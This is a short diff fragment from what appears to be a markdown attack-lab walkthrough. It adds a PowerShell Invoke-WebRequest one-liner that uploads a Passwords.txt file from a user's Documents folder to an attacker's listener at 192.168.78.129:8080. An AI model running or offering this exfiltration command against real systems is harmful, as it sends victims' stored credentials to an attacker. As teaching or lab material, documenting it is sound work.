@@ -140,6 +140,8 @@ At this point they’re ready to begin the second stage of the attack. They’ve
 <br><sub>(Figure 10)</sub><br>
 <img src="analysis/screenshots_v1/Figure_10.png" alt="Upload success" width="65%"><br>
 
+
+This is the full PowerShell command to upload the Passwords.txt file to the attacker's Python server:
  ```powershell
 powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
 # ⚠️ Make sure to update the IP address to match your attacker's listener
